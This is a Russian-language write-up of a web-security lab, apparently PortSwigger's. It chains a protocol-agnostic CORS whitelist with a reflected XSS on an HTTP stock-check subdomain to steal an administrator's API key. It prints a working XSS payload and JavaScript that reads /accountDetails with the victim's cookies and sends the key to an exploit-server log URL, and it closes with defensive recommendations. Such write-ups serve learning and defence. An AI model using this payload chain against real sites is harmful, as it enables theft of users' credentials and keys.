# CORS Vulnerability with Trusted Insecure Protocols 

> **Категория:** Web
> **Сложность:** Practitioner
> **Уязвимость:** CORS Misconfiguration (trust by protocol-agnostic subdomain whitelist) + Reflected XSS

---

## Входные данные

### Условие задания

> Сайт имеет небезопасную конфигурацию CORS: он доверяет **любому поддомену** `*.web-security-academy.net`, независимо от протокола (HTTP или HTTPS). В теории такую уязвимость эксплуатируют через атаку man-in-the-middle: злоумышленник перехватывает HTTP-трафик жертвы к доверенному поддомену и подменяет ответ на свой, с вредоносным JavaScript. В условиях лабы реальный перехват трафика недоступен, поэтому нужно найти **альтернативный способ** выполнить свой код в контексте доверенного поддомена.
>
> Цель: с помощью CORS украсть API-ключ администратора и отправить его в форму решения лабы.

---

## Первичный анализ

### Подтверждение CORS-уязвимости

На странице аккаунта (`My account`) ключ пользователя подгружается AJAX-запросом к `/accountDetails`. В ответе присутствует заголовок:

```
Access-Control-Allow-Credentials: true
```

Это указывает на то, что эндпоинт поддерживает CORS с передачей credentials (cookie). Отправив запрос повторно через Burp Repeater с добавленным заголовком `Origin: http://stock.<LAB-ID>.web-security-academy.net`, я убедился, что сервер **отражает любой origin вида `*.web-security-academy.net`**, не проверяя протокол — то есть HTTP-поддомен так же доверен, как и HTTPS-основной домен.

### Поиск точки внедрения JS

Поскольку реального MITM в лабе нет, нужна была замена этому шагу — способ выполнить свой JavaScript **именно в контексте** доверенного поддомена. Пройдясь по функциональности сайта, я обнаружил единственный HTTP-эндпоинт — запрос кнопки **"Check stock"**:

```
GET http://stock.<LAB-ID>.web-security-academy.net/?productId=1&storeId=1
```

При валидном `productId` сервер просто возвращает уровень склада (`Stock level: N`), без отражения ввода. Но при **невалидном значении** (не числовом) сервер возвращает `400 Bad Request`, в теле которого значение `productId` **подставляется в HTML без экранирования**:

```
GET /?productId=<script>alert(1)</script>&storeId=1 HTTP/1.1
Host: stock.<LAB-ID>.web-security-academy.net
```

```
HTTP/1.1 400 Bad Request
Content-Type: text/html; charset=utf-8

<h4>
    ERROR
</h4>
Invalid product ID: <script>
    alert(1)
</script>
```

Это и есть замена шагу MITM: **отражённая XSS на доверенном HTTP-поддомене**, которая позволяет выполнить произвольный JS в происхождении `http://stock.<LAB-ID>.web-security-academy.net` — том самом, которому доверяет основной сайт.

---

## Эксплуатация

### Суть уязвимости

Цепочка из двух уязвимостей:

1. **Reflected XSS** на `stock.<LAB-ID>.web-security-academy.net` через параметр `productId` при невалидном вводе — позволяет выполнить произвольный JS в происхождении этого поддомена.
2. **Небезопасный CORS** на основном сайте: он доверяет origin `http://stock.<LAB-ID>.web-security-academy.net`, потому что проверяет **только домен**, а не протокол.

Комбинация даёт возможность: внедрить через XSS скрипт, который делает CORS-запрос с credentials к `/accountDetails` и отправляет полученный API-ключ на сторонний сервер (exploit server).

### Пошаговая эксплуатация

**1. Подтвердил XSS в `productId`**

Отправил `productId=<script>alert(1)</script>` напрямую на `stock.<LAB-ID>...` — сервер вернул payload без экранирования в теле `400 Bad Request` (см. скрин выше).

**2. Собрал CORS-скрипт для кражи ключа**

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://<LAB-ID>.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener(){
    location = ('https://<EXPLOIT-ID>.exploit-server.net/log?key='+this.responseText);
}
```

**3. Внедрил скрипт в `productId` и обернул в редирект**

Финальный payload должен делать две вещи: перевести браузер жертвы на уязвимый HTTP-поддомен (чтобы JS выполнился в нужном origin) и внедрить в `productId` сам CORS-скрипт через XSS.

Ключевая сложность: внутри одного HTML-документа оказываются **два** `<script>`-тега (внешний редиректор и внутренний, спрятанный в query-строке), и браузер закрывает внешний тег по первому встреченному `</script>`, даже если тот — просто текст внутри JS-строки. Решение — закодировать теги внутреннего скрипта (`<` → `%3c`, `>` → `%3e`) и символ `+` (→ `%2b`, чтобы при разборе query-строки его не превратило в пробел). Весь payload при этом должен быть **одной строкой**, без переносов — иначе JS падает на незакрытой строковой литерали.

Итоговый payload для **Body** на exploit server:

```html
<script>document.location = "http://stock.<LAB-ID>.web-security-academy.net/?productId=%3cscript%3evar req = new XMLHttpRequest();req.onload = reqListener;req.open('get','https://<LAB-ID>.web-security-academy.net/accountDetails',true);req.withCredentials = true;req.send();function reqListener(){location = ('https://<EXPLOIT-ID>.exploit-server.net/log?key='%2bthis.responseText);}%3c/script%3e&storeId=1";</script>
```

**4. Проверил через "View exploit"**

Payload сработал на собственном аккаунте (wiener:peter) — браузер ушёл на `stock...`, выполнился внедрённый скрипт, CORS-запрос к `/accountDetails` прошёл с cookie, и браузер приземлился на `/log?key=...` с моим собственным ключом в URL.

**5. Доставил эксплойт жертве**

Нажал **Deliver exploit to victim**, подождал несколько секунд и проверил **Access log**.

**6. Отправил ключ в форму решения лабы**

```
<ADMIN_API_KEY>
```

---

---

## Способы защиты

1. **Не доверять протоколу как части whitelist origin.** Белый список CORS должен явно требовать `https://`, а не проверять только домен/поддомен.

2. **Не доверять поддоменам «оптом».** Каждый поддомен, в том числе служебные/HTTP-эндпоинты, может оказаться уязвимым и стать точкой входа для атаки на весь белый список.

3. **Экранировать пользовательский ввод в сообщениях об ошибках.** Error-path часто обрабатывается менее тщательно, чем основной сценарий — именно там и была найдена XSS в этой лабе.

4. **Не использовать `Access-Control-Allow-Credentials: true` без крайней необходимости**, и тем более не сочетать его с широким или протокол-независимым whitelist.

5. **Внедрить HSTS** на всех доменах и поддоменах, чтобы исключить сам факт существования HTTP-эндпоинтов, которые можно использовать для подобных цепочек.
